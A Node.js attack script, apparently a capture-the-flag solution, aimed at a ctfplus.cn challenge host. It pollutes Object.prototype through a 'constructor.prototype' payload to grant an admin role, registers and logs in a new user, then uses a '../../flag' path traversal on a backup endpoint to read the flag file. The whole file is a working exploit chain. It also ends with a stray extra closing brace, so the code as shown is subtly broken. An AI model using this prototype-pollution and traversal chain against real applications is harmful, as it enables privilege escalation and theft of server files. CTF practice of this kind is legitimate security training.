
const http = require('http');
const querystring = require('querystring');

function req(options, callback) {
  const request = http.request(options, (res) => {
    let data = '';
    res.on('data', (chunk) => {
      data += chunk;
    });
    res.on('end', () => {
      callback(null, res, data);
    });
  });
  request.on('error', (err) => {
    callback(err);
  });
  request.end();
}

// 1. First poison the prototype correctly via /api/profile (this is where constructor.prototype works)
console.log("Step 1: Login and poison Object.prototype.role = 'admin'");
const poisonLoginUid = "b050bd44d7a04038b2363d3d9c153b32"; // previous poisoned user
const loginOpts = {
  hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
  port: 80,
  path: '/login',
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': Buffer.byteLength(querystring.stringify({uid: poisonLoginUid}))
  }
};

req(loginOpts, (err, res, body) => {
  if(err) {
    console.error("Login failed", err);
    return;
  }
  const cookie = res.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
  console.log("Logged in, poisoning...");
  const poisonPayload = JSON.stringify({
    uid: poisonLoginUid,
    "constructor": {
      "prototype": {
        "role": "admin"
      }
    }
  });
  const poisonOpts = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/api/profile',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(Buffer.from(poisonPayload)),
      'Cookie': cookie
    }
  };

  req(poisonOpts, (err, res, poisonBody) => {
    if(err) {
      console.error("Poison failed", err);
      return;
    }
    console.log("Poison done, registering new user...");
    const regPayload = querystring.stringify({username: "gotflagfinal"});
    const regOpts = {
      hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
      port: 80,
      path: '/register',
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': Buffer.byteLength(regPayload)
      }
    };

    req(regOpts, (err, res, regBody) => {
      if(err) {
        console.error("Register failed", err);
        return;
      }
      const match = regBody.match(/<span.*?>([a-f0-9]+)<\/span>/);
      if(!match) {
        console.log("No UID found, response:");
        console.log(regBody);
        return;
      }
      const newUid = match[1];
      console.log("New user registered, UID:", newUid);
      console.log("Logging in new user...");
      const newLoginPayload = querystring.stringify({uid: newUid});
      const newLoginOpts = {
        hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
        port: 80,
        path: '/login',
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Content-Length': Buffer.byteLength(newLoginPayload)
        }
      };

      req(newLoginOpts, (err, res, newLoginBody) => {
        if(err) {
          console.error("New login failed", err);
          return;
        }
        const newCookie = res.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
        console.log("Logged in, getting flag...");
        const flagPayload = querystring.stringify({file: '../../flag'});
        const flagOpts = {
          hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
          port: 80,
          path: '/api/backup',
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': Buffer.byteLength(flagPayload),
            'Cookie': newCookie
          }
        };

        req(flagOpts, (err, res, flagBody) => {
          if(err) {
            console.error("Get flag failed", err);
            return;
          }
          console.log("\n\n=====================================");
          console.log("🏁 FINAL FLAG RESULT:");
          console.log(flagBody);
          console.log("=====================================");
        });
      });
    });
  });
});
});
